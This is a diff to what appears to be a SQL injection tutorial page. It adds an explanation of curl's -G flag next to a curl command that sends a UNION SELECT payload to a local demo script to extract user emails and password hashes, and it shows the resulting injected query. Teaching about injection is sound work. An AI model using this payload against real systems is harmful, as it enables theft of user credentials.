@@ -116,6 +116,13 @@
         </p>
         <!-- prettier-ignore -->
         <code-block>curl -G --data-urlencode "q=' UNION SELECT email, password_hash, 0 FROM users -- " http://localhost:8000/naive.php</code-block>
+        <p>New here:</p>
+        <breakdown>
+            <part code="-G"
+                >The short way to write <cde>--get</cde>: put the data in the URL's query string and
+                send a GET, not a POST.</part
+            >
+        </breakdown>
         <p>The query MySQL ran was this:</p>
         <!-- prettier-ignore -->
         <code-block>SELECT title, author, year FROM books WHERE title LIKE '%' UNION SELECT email, password_hash, 0 FROM users -- %' ORDER BY title</code-block>
